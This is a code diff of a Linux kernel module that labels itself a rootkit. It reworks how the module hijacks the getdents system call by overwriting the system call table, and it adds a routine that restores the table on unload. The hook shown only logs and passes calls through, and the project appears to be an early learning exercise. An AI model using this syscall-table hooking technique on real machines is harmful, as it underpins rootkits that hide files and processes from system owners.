@@ -17,11 +17,10 @@ MODULE_VERSION("0.1");
 
 unsigned long *syscall_table = NULL;
 
-typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
-sys_getdents_t sys_getdents_orig = NULL;
+asmlinkage long (*sys_getdents_orig)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
 	long ret = sys_getdents_orig(fd, dirent, count);
-	printk(KERN_INFO "ROOTKIT Hello from sys_getdents\n");
+	printk(KERN_INFO "ROOTKIT sys_getdents reading %u entries\n", count);
 	return ret;
 }
 
@@ -56,12 +55,12 @@ int __init hooks(void){
 	printk(KERN_INFO "ROOTKIT Syscall table found at %lx\n", (long unsigned int)syscall_table);
 	printk(KERN_INFO "ROOTKIT Starting hooks\n");
 
-	//printk(KERN_INFO "ROOTKIT Original sys_getdents at %lx\n", original_sys_getdents);
+	sys_getdents_orig = (void*)syscall_table[__NR_getdents];
+
 	ENABLE_WRITE();
 	//sys_getdents_orig = (void*)syscall_table[__NR_getdents]; // OJO CASTING
 	//syscall_table[__NR_getdents] = &sys_getdents_hook;
-	sys_getdents_orig = (sys_getdents_t)((void**)syscall_table)[__NR_getdents];
-	syscall_table[__NR_getdents] = sys_getdents_hook;
+	syscall_table[__NR_getdents] = &sys_getdents_hook;
 
 	//sys_execve_orig = (void*)syscall_table[__NR_execve];
 	//syscall_table[__NR_execve] = &sys_execve_hook;
@@ -77,6 +76,12 @@ int __init hooks(void){
 	return 0;
 }
 
+
+void __exit unhooks(void){
+	ENABLE_WRITE();
+	syscall_table[__NR_getdents] = sys_getdents_orig;
+	DISABLE_WRITE();
+}
 //insmod
 static int lkm_init(void){
     printk(KERN_INFO "ROOTKIT Starting Rootkit -----------------\n");
@@ -85,6 +90,7 @@ static int lkm_init(void){
 
 //rmmod
 static void lkm_exit(void){
+	unhooks();
     printk(KERN_INFO "ROOTKIT Finishing Rootkit ----------------\n");
 }
 
